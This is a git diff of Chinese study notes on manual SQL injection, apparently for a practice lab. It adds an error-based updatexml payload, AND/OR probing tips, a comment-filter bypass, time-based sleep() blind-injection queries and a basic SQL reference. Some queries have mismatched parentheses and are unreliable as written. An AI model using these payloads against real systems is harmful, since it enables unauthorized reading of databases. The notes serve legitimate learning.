@@ -58,6 +58,8 @@ SELECT * FROM users WHERE id='' union select 1,group_concat(id),3 from users;
 +----+-------------------------------+----------+
 |  1 | 1,2,3,4,5,6,7,8,9,10,11,12,14 | 3        |
 +----+-------------------------------+----------+
+SELECT * FROM users WHERE id='' and updatexml(1, concat(0x7e, ((select group_concat(table_name) from information_schema.tables where table_schema='security')), 0x7e), 3);
+
 -- 2、联合查询和and的区别
 -- uniont select前后是两个逻辑，他们之间没有与或非的关系
 SELECT * FROM users WHERE id=1 and 1=2 union select 1,2,3;
@@ -86,6 +88,42 @@ select * from users where id='1' and length(select database()) = name-length;
 select * from users where id='1' and length((select database()) = name-length;
 ```
 
+## 基本语句
+
+```sql
+#显示所有数据库
+show databases;
+#显示当前数据库所有表
+show tables;
+#选择数据库
+use xxx_
+#显示表结构
+describe xxx_table;
+#创建数据库
+create database xxx_base;
+#创建表,格式为（列名 数据类型 主键 不允许为空 自动增加序号），其中列名和数据类型为必须，其余顺序可变或为空 
+create table xxx_table (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    name VARCHAR(100) NOT NULL,
+    age INT NOT NULL,
+    email VARCHAR(100)
+);
+#插入数据(空部分代表为int类型，反正不是字符型)
+insert into xxx_table (row_1, row_2, row_3) values('', , '')
+#查询数据(其中字符型数据需要加'或")
+select row_1，row_2 from xxx_table where row_1 = '';
+#查看表内所有数
+select * from table_name;
+#更新数据
+update xxx_table set row_1 = '' where row_2 = '';
+#删除数据
+delete from xxx_table where row_1 = '';
+#删除表
+drop table xxx_table;
+#删除数据库
+drop database xxx_base;
+```
+
 
 
 ## 手注思路
@@ -93,7 +131,15 @@ select * from users where id='1' and length((select database()) = name-length;
 ```sql
 -- 1、判断是否有注入
 -- 挨着尝试 无闭合，''闭合，""闭合，('')闭合，("")闭合，((''))闭合，((""))闭合；然后加上and 1=1和and 1=2看是否存在注入，如果第一个逻辑真返回为原始查询，第二个逻辑假返回另一个结果(不一定是报错，但是肯定和原始查询结果不一样）则证明存在该闭合注入，否则不好说（可能被过滤了and逻辑或者没有注入点或者存在时间盲注点）。
+-- 这里用and的前提是and前的逻辑（原始输入）是正确的
+-- 如果原始输入是猜不到的或者不正确的，那么就使用OR尝试，OR 1=1即可
 
+-- OR:
+-- 对于原始输入无法猜到的情况，就要用OR
+-- OR一般尽量用在最后一个传入数据库的参数处，包括后续的注入逻辑也尽量用在最后一个传入数据库的参数处
+
+
+-- --+不能用的时候试试-- qwe，可能会过滤掉+号
 
 -- 2、选择注入方式
 -- 联合注入（有显式回显的情况）
@@ -180,7 +226,7 @@ select * from users where id='1' and length(database()) = name-length;
 select * from users where id='1' and length((select database())) = name-length;
 
 -- 猜名字之取子串substr()
--- 取database()的从a开始长度为b的子串
+-- 取database()的从a开始长度为b的子串（从1开始）
 select * from users where id='1' and substr((select database(), a, b)) = "sub-str";
 -- 取ascii()
 select * from users where id='1' and ascii("a") = 97;
@@ -191,6 +237,15 @@ select * from users where id='1' and ascii(substr((select database(), a, b)) = 9
 
 -- 这里比较特殊的是取表名长(需要用limit限制输出)
 select * from users where id='1' and length((select table_name from information_schema.tables where table_schema="security" limit 0, 1)) = 8;
+```
+
+## 时间注入详解
+
+```sql
+-- 在尝试1=1后如果延迟返回则存在时间注入
+select * from users where id=1 and if(1=1, sleep(5), 1);
+-- 类似布尔盲注，爆库名长
+select * from users where id=1 and if(length((select database()))=8, sleep(5), 1);
 ```
 
 
